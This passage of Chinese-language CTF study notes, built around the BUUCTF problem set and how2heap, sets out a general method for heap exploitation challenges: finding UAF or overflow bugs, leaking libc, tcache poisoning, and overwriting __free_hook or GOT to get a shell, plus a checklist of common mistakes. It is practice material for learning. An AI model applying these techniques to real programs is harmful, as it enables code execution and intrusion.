> 题目名以 BUUCTF 题库为准，搜不到就用 how2heap 的对应 demo 代替，
> **how2heap 是主线，题目是检验**。

---

## 10. 堆题通用解题骨架（拿到题就按这个走）

1. `checksec` + **`strings libc.so.6 | grep "GNU C Library"`** → 定版本
2. IDA 看菜单四件套：`add` / `edit` / `delete` / `show`，找漏洞点：
   - `edit` 能不能自定义长度？（堆溢出）
   - `delete` 之后指针清空了吗？（UAF）
   - `show` 能不能打印已 free 的块？（泄露）
3. 确定漏洞原语：UAF / double free / overflow / off-by-one
4. 构造 **leak libc**（必要时也 leak heap）
5. 构造 **任意地址写**（tcache poisoning 为主）
6. 选目标写：`__free_hook` → GOT → stdout → exit
7. get shell

---

## 11. 常见误区自查

- [ ] 忘了 libc 版本就动手 → 白写一天
- [ ] 泄露 libc 时没垫块，被 top 吞了 → `fd` 里是垃圾
- [ ] 把 `mem` 和 `chunk` 头搞混，偏移算错 0x10
- [ ] 忘了 `prev_size` 会被借用，可用空间算少/算多 8 字节
- [ ] 在 2.34+ 上猛写 `__free_hook`
- [ ] 用 tcache 的思路去 double free（2.29+ 会 abort）
- [ ] 只看 writeup 不 gdb → 下次还是不会
